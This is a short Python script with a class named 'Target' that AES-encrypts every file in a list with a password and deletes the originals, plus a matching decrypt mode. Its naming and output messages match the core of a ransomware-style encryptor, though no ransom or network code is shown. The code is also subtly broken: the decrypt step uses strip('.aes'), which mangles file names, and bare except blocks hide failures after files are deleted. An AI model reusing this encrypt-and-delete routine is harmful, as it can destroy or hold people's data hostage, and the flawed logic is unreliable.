from pyAesCrypt import decryptFile, encryptFile
from sys import argv
from ntpath import split
import os

BUFFER_SIZE = 64 * 1024

class Target():
    
    def __init__(self, mode, files, password):
        self.files = files
        self.password = password
        self.mode = mode
    
    def encrypt(self):
        for f in self.files:
            if f == os.path.abspath(argv[0]):
                continue
            else:
                print(f"[!] Encrypting {split(f)[1]} with AES256!")
                encryptFile(f, f + '.aes', self.password, BUFFER_SIZE)
                print(f"[!] Deleting original file: {split(f)[1]}!")
                os.remove(f)

    def decrypt(self):
        for f in self.files:
            file_name, file_extension = os.path.splitext(f)
            if f == os.path.abspath(argv[0]):
                continue
            elif file_extension != '.aes':
                continue
            else:
                print(f"[!] Decrypting (AES256) {split(f)[1]}...")
                decryptFile(f, f.strip('.aes'), self.password, BUFFER_SIZE)
                print(f"[!] Deleting encrypted file: {split(f)[1]}!")
                os.remove(f)

    def file_ops(self):
        if self.mode == '-e':
            try:
                self.encrypt()
            except:
                print("[x] Failed!")
            else:
                print("[*] Done!")
        elif self.mode == '-d':
            try:
                self.decrypt()
            except:
                print("[x] Failed!")
            else:
                print("[*] Done!")

    